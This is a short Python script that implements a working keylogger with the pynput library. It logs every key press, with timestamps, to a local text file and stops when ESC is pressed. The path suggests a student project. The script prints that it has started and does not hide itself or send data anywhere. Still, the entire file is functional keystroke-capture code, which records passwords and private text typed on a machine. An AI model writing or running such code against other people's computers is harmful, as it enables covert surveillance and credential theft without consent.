from pynput import keyboard
import os
import datetime

# Global variables
log_file = "E:\PRASUNET\keylogs.txt"
listener = None

# Function to log the keys with a timestamp
def on_press(key):
    try:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        key_str = str(key).replace("'", "")
        
        if key == keyboard.Key.space:
            key_str = ' [SPACE] '
        elif key == keyboard.Key.enter:
            key_str = ' [ENTER]\n'
        elif key == keyboard.Key.tab:
            key_str = ' [TAB] '
        elif key == keyboard.Key.backspace:
            key_str = ' [BACKSPACE] '
        elif key == keyboard.Key.esc:
            key_str = ' [ESC] '

        with open(log_file, "a") as f:
            f.write(f"{timestamp} - {key_str}\n")
    except Exception as e:
        print(f"Failed to log key: {e}")

# Function to stop the keylogger
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Function to start the keylogger
def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

# Main function
if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    start_keylogger()
    print("Keylogger stopped.")
